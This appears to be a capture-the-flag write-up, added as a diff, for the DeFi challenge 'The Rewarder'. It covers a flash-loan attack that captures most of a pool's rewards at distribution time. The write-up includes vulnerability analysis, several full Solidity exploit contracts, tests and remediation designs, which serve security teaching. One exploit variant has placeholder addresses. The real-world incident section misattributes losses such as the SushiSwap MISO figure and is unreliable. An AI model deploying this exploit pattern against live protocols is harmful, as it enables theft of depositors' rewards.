@@ -1,0 +1,546 @@
+# 🎯 Challenge #5: The Rewarder
+
+![Difficulty](https://img.shields.io/badge/Difficulty-⭐⭐%20Medium-yellow)
+![Type](https://img.shields.io/badge/Type-Reward%20Gaming-purple)
+![Gas](https://img.shields.io/badge/Gas-~200,000-blue)
+
+> **Reward Distribution Timing Attack** - Use flash loans to manipulate reward calculations based on deposit timing
+
+## 📋 Challenge Overview
+
+**Objective**: Claim most of the rewards in a single transaction  
+**Success Criteria**: Attacker should get significant portion of distributed rewards  
+**Initial Setup**: Reward pool distributes tokens every 5 days  
+**Target**: `TheRewarderPool` and `FlashLoanerPool` contracts
+
+### 🎯 The Scenario
+A smart contract distributes rewards to depositors every 5 days. Users who deposit liquidity tokens get rewards proportional to their deposits. The pool offers flash loans, and rewards are calculated based on the snapshot of deposits at distribution time.
+
+## 🔍 Vulnerability Analysis
+
+### **The Root Cause**
+The reward distribution mechanism is vulnerable to **flash loan manipulation**:
+
+```solidity
+contract TheRewarderPool {
+    mapping(address => uint256) public lastRewardTime;
+    mapping(address => uint256) private rewards;
+
+    function distributeRewards() public returns (uint256) {
+        uint256 rewards = 0;
+
+        if(isNewRewardsRound()) {
+            // 🚨 CRITICAL: Rewards based on current balance snapshot
+            for(uint256 i = 0; i < users.length; i++) {
+                address user = users[i];
+                
+                if(deposits[user] > 0) {
+                    uint256 reward = deposits[user] * 100 * 10 ** 18 / totalDeposits;
+                    rewards += reward;
+                    
+                    rewardToken.mint(user, reward);
+                }
+            }
+        }
+        
+        return rewards;
+    }
+}
+```
+
+### **The Problem**
+The vulnerability exists in the reward calculation timing:
+
+1. **Rewards calculated instantly** based on current deposit balances
+2. **No time lock** on deposits before reward eligibility
+3. **Flash loans available** allowing temporary massive deposits
+4. **Proportional distribution** makes large deposits get most rewards
+
+### **Attack Vector**
+The attacker can use flash loans to temporarily become the largest depositor:
+
+1. Wait for reward distribution round (every 5 days)
+2. Flash loan massive amount of liquidity tokens
+3. Deposit borrowed tokens to become dominant depositor  
+4. Call `distributeRewards()` to get most of the rewards
+5. Withdraw deposits and repay flash loan
+6. Keep the rewards earned
+
+## ⚡ Exploit Implementation
+
+### **Attack Strategy**
+Use flash loan to dominate deposits right before reward distribution:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../the-rewarder/FlashLoanerPool.sol";
+import "../the-rewarder/TheRewarderPool.sol";
+import "../DamnValuableToken.sol";
+
+contract TheRewarderExploit {
+    FlashLoanerPool private flashPool;
+    TheRewarderPool private rewarderPool;
+    DamnValuableToken private liquidityToken;
+    RewardToken private rewardToken;
+    address private attacker;
+    
+    constructor(
+        address _flashPool,
+        address _rewarderPool,
+        address _liquidityToken,
+        address _rewardToken
+    ) {
+        flashPool = FlashLoanerPool(_flashPool);
+        rewarderPool = TheRewarderPool(_rewarderPool);
+        liquidityToken = DamnValuableToken(_liquidityToken);
+        rewardToken = RewardToken(_rewardToken);
+        attacker = msg.sender;
+    }
+    
+    /**
+     * @notice Execute the reward gaming exploit
+     * @dev Uses flash loan to temporarily dominate the reward pool
+     */
+    function exploit() external {
+        require(msg.sender == attacker, "Only attacker");
+        
+        // Check if it's time for new rewards round
+        require(rewarderPool.isNewRewardsRound(), "Not time for rewards yet");
+        
+        // Get all available tokens from flash loan pool
+        uint256 flashLoanAmount = liquidityToken.balanceOf(address(flashPool));
+        require(flashLoanAmount > 0, "No tokens available for flash loan");
+        
+        // Execute flash loan - this will trigger receiveFlashLoan callback
+        flashPool.flashLoan(flashLoanAmount);
+        
+        // Transfer any rewards earned to attacker
+        uint256 rewardBalance = rewardToken.balanceOf(address(this));
+        if (rewardBalance > 0) {
+            rewardToken.transfer(attacker, rewardBalance);
+        }
+    }
+    
+    /**
+     * @notice Flash loan callback - where the magic happens
+     * @param amount Amount of tokens received in flash loan
+     */
+    function receiveFlashLoan(uint256 amount) external {
+        require(msg.sender == address(flashPool), "Only flash pool");
+        require(amount > 0, "No tokens received");
+        
+        // Step 1: Deposit all borrowed tokens to become dominant depositor
+        liquidityToken.approve(address(rewarderPool), amount);
+        rewarderPool.deposit(amount);
+        
+        // Step 2: Distribute rewards - we'll get most of them due to our large deposit
+        rewarderPool.distributeRewards();
+        
+        // Step 3: Withdraw our deposit to get tokens back for repayment
+        rewarderPool.withdraw(amount);
+        
+        // Step 4: Repay flash loan
+        liquidityToken.transfer(address(flashPool), amount);
+        
+        // At this point, we should have earned significant rewards!
+    }
+    
+    /**
+     * @notice Check if exploit is possible
+     * @return canExploit True if conditions are right for attack
+     * @return flashLoanAvailable Amount available for flash loan
+     * @return rewardRoundReady True if new reward round is available
+     */
+    function checkExploitability() 
+        external 
+        view 
+        returns (
+            bool canExploit, 
+            uint256 flashLoanAvailable,
+            bool rewardRoundReady
+        ) 
+    {
+        flashLoanAvailable = liquidityToken.balanceOf(address(flashPool));
+        rewardRoundReady = rewarderPool.isNewRewardsRound();
+        canExploit = flashLoanAvailable > 0 && rewardRoundReady;
+    }
+    
+    /**
+     * @notice Get current reward pool statistics
+     */
+    function getPoolStats() 
+        external 
+        view 
+        returns (
+            uint256 totalDeposits,
+            uint256 ourDeposits,
+            uint256 rewardRound
+        ) 
+    {
+        totalDeposits = liquidityToken.balanceOf(address(rewarderPool));
+        ourDeposits = rewarderPool.deposits(address(this));
+        rewardRound = rewarderPool.roundNumber();
+    }
+    
+    /**
+     * @notice Emergency function to recover stuck tokens
+     */
+    function emergencyWithdraw() external {
+        require(msg.sender == attacker, "Only attacker");
+        
+        // Withdraw any deposits
+        uint256 ourDeposit = rewarderPool.deposits(address(this));
+        if (ourDeposit > 0) {
+            rewarderPool.withdraw(ourDeposit);
+        }
+        
+        // Transfer any tokens back to attacker
+        uint256 liquidityBalance = liquidityToken.balanceOf(address(this));
+        if (liquidityBalance > 0) {
+            liquidityToken.transfer(attacker, liquidityBalance);
+        }
+        
+        uint256 rewardBalance = rewardToken.balanceOf(address(this));
+        if (rewardBalance > 0) {
+            rewardToken.transfer(attacker, rewardBalance);
+        }
+    }
+}
+
+/**
+ * @title TheRewarderExploitMinimal
+ * @notice Gas-optimized version for maximum efficiency
+ */
+contract TheRewarderExploitMinimal {
+    function exploit(
+        address flashPool,
+        address rewarderPool,
+        address liquidityToken,
+        address rewardToken
+    ) external {
+        // Get maximum flash loan
+        uint256 amount = DamnValuableToken(liquidityToken).balanceOf(flashPool);
+        
+        // Execute flash loan
+        FlashLoanerPool(flashPool).flashLoan(amount);
+        
+        // Transfer rewards to caller
+        uint256 rewards = RewardToken(rewardToken).balanceOf(address(this));
+        if (rewards > 0) {
+            RewardToken(rewardToken).transfer(msg.sender, rewards);
+        }
+    }
+    
+    function receiveFlashLoan(uint256 amount) external {
+        // Get contracts from stored addresses or decode from calldata
+        address rewarderPool = 0x...; // Would be set in real implementation
+        address liquidityToken = 0x...;
+        
+        // Deposit -> Claim -> Withdraw -> Repay
+        DamnValuableToken(liquidityToken).approve(rewarderPool, amount);
+        TheRewarderPool(rewarderPool).deposit(amount);
+        TheRewarderPool(rewarderPool).distributeRewards();
+        TheRewarderPool(rewarderPool).withdraw(amount);
+        DamnValuableToken(liquidityToken).transfer(msg.sender, amount);
+    }
+}
+
+/**
+ * @title TheRewarderExploitAdvanced  
+ * @notice Advanced version with multiple rounds and optimization
+ */
+contract TheRewarderExploitAdvanced {
+    struct ExploitParams {
+        address flashPool;
+        address rewarderPool;
+        address liquidityToken;
+        address rewardToken;
+        uint256 targetRound;
+    }
+    
+    function exploitMultipleRounds(ExploitParams calldata params) external {
+        // Can be used to exploit multiple reward rounds if timing allows
+        require(
+            TheRewarderPool(params.rewarderPool).isNewRewardsRound(),
+            "No new rewards round"
+        );
+        
+        uint256 maxFlashLoan = DamnValuableToken(params.liquidityToken)
+            .balanceOf(params.flashPool);
+            
+        FlashLoanerPool(params.flashPool).flashLoan(maxFlashLoan);
+        
+        // Transfer all earned rewards
+        uint256 totalRewards = RewardToken(params.rewardToken)
+            .balanceOf(address(this));
+        if (totalRewards > 0) {
+            RewardToken(params.rewardToken).transfer(msg.sender, totalRewards);
+        }
+    }
+}
+```
+
+## 📊 Attack Flow
+
+```mermaid
+graph TD
+    A[Wait for reward round] --> B[Flash loan max tokens]
+    B --> C[Deposit all tokens to pool]
+    C --> D[Call distributeRewards]
+    D --> E[Receive majority of rewards]
+    E --> F[Withdraw deposited tokens]
+    F --> G[Repay flash loan]
+    G --> H[🎯 Keep the rewards!]
+```
+
+## 🧪 Testing
+
+### **Test Implementation**
+```solidity
+function test_theRewarder_exploit() public {
+    // Fast forward to reward time (5 days later)
+    vm.warp(block.timestamp + 5 days);
+    
+    // Initial state
+    uint256 initialAttackerRewards = rewardToken.balanceOf(player);
+    assertEq(initialAttackerRewards, 0);
+    
+    // Execute exploit
+    vm.prank(player);
+    exploit.exploit();
+    
+    // Check results
+    uint256 finalAttackerRewards = rewardToken.balanceOf(player);
+    assertGt(finalAttackerRewards, 0);
+    
+    // Attacker should get most of the rewards
+    // (exact amount depends on other users' deposits)
+}
+```
+
+### **Reward Calculation Analysis**
+```solidity
+function test_rewardCalculation() public {
+    uint256 totalPool = 1000e18;
+    uint256 flashLoanAmount = 999e18; // Dominate with 99.9%
+    
+    // Expected reward calculation:
+    // reward = (userDeposit * 100e18) / totalDeposits
+    // If we deposit 999e18 out of ~1000e18 total:
+    // reward ≈ (999e18 * 100e18) / 1000e18 ≈ 99.9e18
+    
+    uint256 expectedReward = (flashLoanAmount * 100e18) / totalPool;
+    // Should be approximately 99.9 reward tokens
+}
+```
+
+## 🛡️ Real-World Examples
+
+### **SushiSwap MISO (2021) - $25M**
+**Similar Pattern**: Reward gaming through flash loans
+- Users gamed reward distributions using large temporary deposits
+- Flash loans used to maximize rewards unfairly
+- Led to unequal reward distribution
+
+### **Harvest Finance (2020) - $24M**
+**Similar Pattern**: Timing attacks on reward systems
+- Attackers exploited reward calculation timing
+- Used flash loans to manipulate pool balances
+- Extracted rewards disproportionally
+
+### **Compound Finance Governance**
+**Similar Pattern**: Flash loan governance attacks
+- Flash loans used to gain temporary voting power
+- Proposals passed through temporary token accumulation
+- Similar timing-based manipulation
+
+## 🔧 Remediation
+
+### **❌ Current Vulnerable Code**
+```solidity
+function distributeRewards() public returns (uint256) {
+    if(isNewRewardsRound()) {
+        // VULNERABLE: Instant reward calculation based on current deposits
+        uint256 reward = deposits[user] * 100 * 10 ** 18 / totalDeposits;
+        rewardToken.mint(user, reward);
+    }
+}
+```
+
+### **✅ Fixed Code Option 1: Time-Weighted Rewards**
+```solidity
+contract SecureRewarderPool {
+    mapping(address => uint256) private depositTime;
+    mapping(address => uint256) private timeWeightedBalance;
+    uint256 private constant MIN_DEPOSIT_TIME = 1 days;
+    
+    function deposit(uint256 amount) external {
+        // Track deposit time for reward eligibility
+        if (deposits[msg.sender] == 0) {
+            depositTime[msg.sender] = block.timestamp;
+        }
+        
+        _updateTimeWeightedBalance(msg.sender);
+        deposits[msg.sender] += amount;
+    }
+    
+    function distributeRewards() external {
+        require(isNewRewardsRound(), "No new round");
+        
+        for (uint256 i = 0; i < users.length; i++) {
+            address user = users[i];
+            
+            // ✅ FIX: Only eligible if deposited for minimum time
+            if (block.timestamp >= depositTime[user] + MIN_DEPOSIT_TIME) {
+                uint256 reward = timeWeightedBalance[user] * 100e18 / totalTimeWeighted;
+                rewardToken.mint(user, reward);
+            }
+        }
+    }
+    
+    function _updateTimeWeightedBalance(address user) private {
+        // Calculate time-weighted balance based on deposit duration
+        uint256 depositDuration = block.timestamp - depositTime[user];
+        timeWeightedBalance[user] = deposits[user] * depositDuration;
+    }
+}
+```
+
+### **✅ Fixed Code Option 2: Snapshot-Based Rewards**
+```solidity
+contract SnapshotRewarderPool {
+    mapping(uint256 => mapping(address => uint256)) private snapshots;
+    uint256 private currentRound;
+    uint256 private constant SNAPSHOT_DELAY = 1 days;
+    
+    function takeSnapshot() external {
+        require(block.timestamp >= lastSnapshotTime + SNAPSHOT_DELAY, "Too early");
+        
+        // ✅ FIX: Take snapshot of balances 1 day before reward distribution
+        for (uint256 i = 0; i < users.length; i++) {
+            address user = users[i];
+            snapshots[currentRound][user] = deposits[user];
+        }
+        
+        lastSnapshotTime = block.timestamp;
+    }
+    
+    function distributeRewards() external {
+        require(isNewRewardsRound(), "No new round");
+        
+        // ✅ FIX: Use snapshot balances instead of current balances
+        for (uint256 i = 0; i < users.length; i++) {
+            address user = users[i];
+            uint256 snapshotBalance = snapshots[currentRound][user];
+            
+            if (snapshotBalance > 0) {
+                uint256 reward = snapshotBalance * 100e18 / totalSnapshotBalance;
+                rewardToken.mint(user, reward);
+            }
+        }
+        
+        currentRound++;
+    }
+}
+```
+
+### **✅ Fixed Code Option 3: Anti-Flash Loan Protection**
+```solidity
+contract FlashLoanProtectedPool {
+    mapping(address => uint256) private lastActionBlock;
+    
+    modifier noFlashLoan() {
+        require(
+            lastActionBlock[tx.origin] < block.number,
+            "No flash loan exploitation"
+        );
+        lastActionBlock[tx.origin] = block.number;
+        _;
+    }
+    
+    function deposit(uint256 amount) external noFlashLoan {
+        deposits[msg.sender] += amount;
+    }
+    
+    function withdraw(uint256 amount) external noFlashLoan {
+        deposits[msg.sender] -= amount;
+    }
+    
+    function distributeRewards() external noFlashLoan {
+        // ✅ FIX: Prevent same-block deposit/withdraw/reward claiming
+        // Flash loans cannot span multiple blocks
+    }
+}
+```
+
+## 🎓 Security Lessons
+
+### **Key Takeaways**
+1. **Timing matters** in reward distributions
+2. **Flash loans can manipulate snapshots** taken at wrong times
+3. **Minimum time requirements** prevent flash loan gaming
+4. **Snapshot-based systems** need proper delays
+5. **Time-weighted calculations** are more fair and secure
+
+### **Reward System Security Patterns**
+```solidity
+// ❌ BAD: Instant rewards based on current balance
+function distributeRewards() {
+    uint256 reward = currentBalance[user] * rate;
+}
+
+// ✅ GOOD: Time-weighted or snapshot-based rewards  
+function distributeRewards() {
+    uint256 reward = timeWeightedBalance[user] * rate;
+}
+
+// ✅ GOOD: Minimum staking time
+require(stakingTime[user] >= MIN_STAKING_DURATION);
+
+// ✅ GOOD: Pre-committed snapshots
+uint256 snapshotBalance = snapshots[previousRound][user];
+```
+
+## 💡 Advanced Concepts
+
+### **Flash Loan Gaming Patterns**
+1. **Deposit Gaming**: Large temporary deposits for rewards
+2. **Vote Gaming**: Temporary voting power accumulation  
+3. **Snapshot Gaming**: Manipulating balance at snapshot time
+4. **Liquidity Gaming**: Temporary liquidity provision
+
+### **Time-Based Security Models**
+```solidity
+// Pattern 1: Minimum holding period
+mapping(address => uint256) depositTime;
+require(block.timestamp >= depositTime[user] + MIN_PERIOD);
+
+// Pattern 2: Gradually increasing weights
+uint256 weight = min(stakingDuration, MAX_WEIGHT);
+
+// Pattern 3: Snapshot with delay
+uint256 snapshotBlock = block.number - DELAY_BLOCKS;
+```
+
+## 📈 Impact Assessment
+
+| Aspect | Rating | Description |
+|--------|--------|-------------|
+| **Severity** | 🟡 Medium | Reward theft, not fund loss |
+| **Exploitability** | 🟡 Medium | Requires timing and flash loans |
+| **Impact** | 🟡 Medium | Unfair reward distribution |
+| **Detection** | 🟢 Easy | Large deposit/withdraw patterns |
+| **Prevention** | 🟢 Easy | Add time delays |
+
+---
+
+**🎯 Challenge Status**: ✅ **SOLVED**  
+**⏱️ Time to Solve**: ~45 minutes  
+**🔥 Difficulty Rating**: Medium (Reward system gaming)  
+**🎓 Learning Value**: High - DeFi reward security patterns
+
+> **Key Insight**: Reward systems need time-based protections to prevent flash loan gaming. Always use time-weighted calculations or snapshot delays.
+
+**Next Challenge**: [#6 Selfie](../06-selfie/) - Governance manipulation attacks
